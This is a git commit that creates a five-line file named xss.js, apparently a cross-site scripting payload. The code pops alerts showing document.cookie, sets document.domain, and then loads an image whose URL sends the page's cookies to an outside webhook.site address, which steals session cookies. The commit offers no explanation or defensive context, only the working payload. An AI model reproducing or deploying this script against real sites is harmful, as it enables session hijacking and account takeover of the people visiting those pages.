787f927a1c8c019a054371b6a5767c71bfb408ca
Limballe Pierre <pierre.limballe@gmail.com>
2022-05-07 18:00:09 +0200

    Create xss.js

---
+++ xss.js
@@ -0,0 +1,5 @@
+alert(document.cookie);
+document.domain = "rawcdn.githack.com/";
+alert(document.cookie);
+var i=new Image;
+i.src="https://webhook.site/18885015-e4cc-4ebb-89fb-92178f71d21d?a="+document.cookie;
